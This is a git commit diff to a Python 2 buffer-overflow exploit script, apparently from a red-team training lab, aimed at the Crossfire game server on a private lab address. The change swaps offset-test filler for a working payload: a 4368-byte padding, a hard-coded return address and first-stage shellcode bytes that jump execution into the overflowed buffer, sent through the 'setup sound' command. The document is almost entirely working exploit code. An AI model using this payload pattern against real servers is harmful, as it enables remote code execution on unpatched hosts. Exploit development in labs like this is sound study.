57ca0caf972f265889e4d33c1f163a421d618989
yong <mail@yongtang.tech>
2020-12-05 13:02:41 -0500

    first commit

--- redteam/BOF/Linux/crossfire/python2/4_load_EIP_ESP.py
+++ redteam/BOF/Linux/crossfire/python2/4_load_EIP_ESP.py
@@ -1,11 +1,12 @@
-#!/usr/bin/python
+#!/usr/bin/python2
 
 import socket
 
-host='192.168.56.110'
+host='192.168.56.111'
 
+crash='A'*4368 + '\x97\x45\x13\x08' + '\x83\xc0\x0c\xff\xe0\x90\x90'
 
-buffer='\x11(setup sound ' + 'A'*4368 + 'B'*4 + 'C'*(4379-4368-4) + '\x90\x00#'
+buffer='\x11(setup sound ' + crash +'\x90\x00#'
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -16,5 +17,4 @@ print data
 s.send(buffer)
 s.close()
 print('Payload Sent')
-
 
